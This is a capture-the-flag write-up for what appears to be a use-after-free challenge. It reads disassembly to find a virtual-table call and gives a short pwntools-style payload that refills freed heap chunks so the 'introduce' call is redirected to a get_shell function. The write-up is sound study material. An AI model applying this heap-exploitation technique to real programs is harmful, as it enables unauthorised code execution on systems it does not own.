If we look at this assembly code, we know that the offset address of option 1 called is 8. That's the `introduce` function.
```
<+265>:	mov    rax,QWORD PTR [rbp-0x38]
<+269>:	mov    rax,QWORD PTR [rax]
**<+272>:	add    rax,0x8**
<+276>:	mov    rdx,QWORD PTR [rax]
<+279>:	mov    rax,QWORD PTR [rbp-0x38]
```
`$rbp-0x38` contains heap address which points to 0x401570. If i'm not mistaken, this is first entry of virtual pointer table in this binary and it points to `get_shell` function. If I can manage to change the pointer to 0x401568 (0x401570 - 8), I'll beat it.

According to this site: https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-5-934192cba269, freed chunks in heap (if it's a fast bin) will ordered in LIFO order.
Because we have 2 objects, `m` and `w` respectively, and I have to fill at least `m` object, I sent the `evil payload` 2 times. First one will fill in `w` object, and the second one will fill `m` object.
```
evil = pack("II", 0x401570-8, 0x0000000)
p.sendline('2')
p.sendline(evil)
p.recv(1024)
p.sendline('2')
p.sendline(evil)
p.recv(1024)
```
From here the heap `$rbp-0x38` points to must be filled by address of -8 byte shifted.
So if I choose option 1, I will get the shell.







SPOILER ALERT!!!








[Spoiler](spoiler.png)
